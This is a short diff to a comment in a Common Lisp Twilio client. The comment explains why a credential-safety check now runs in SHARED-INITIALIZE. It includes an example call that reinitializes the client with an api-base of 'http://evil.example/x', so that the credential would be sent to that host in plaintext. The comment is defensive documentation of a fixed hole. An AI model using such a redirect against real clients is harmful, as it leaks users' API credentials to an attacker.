@@ -99,7 +99,7 @@ against a future change to %TWILIO-ENDPOINT rather than against any base."
 SHARED-INITIALIZE AND NOT INITIALIZE-INSTANCE. The check used to hang off
 INITIALIZE-INSTANCE :AFTER, which REINITIALIZE-INSTANCE does not call, so
 
-  (reinitialize-instance (make-instance 'hermes::twilio ...) :endpoint \"http://evil.example/x\")
+  (reinitialize-instance (make-instance 'hermes::twilio ...) :api-base \"http://evil.example/x\")
 
 was accepted and the next send carried the credential there in plaintext. SHARED-INITIALIZE runs
 for both, so there is no second door (the review of #1104)."
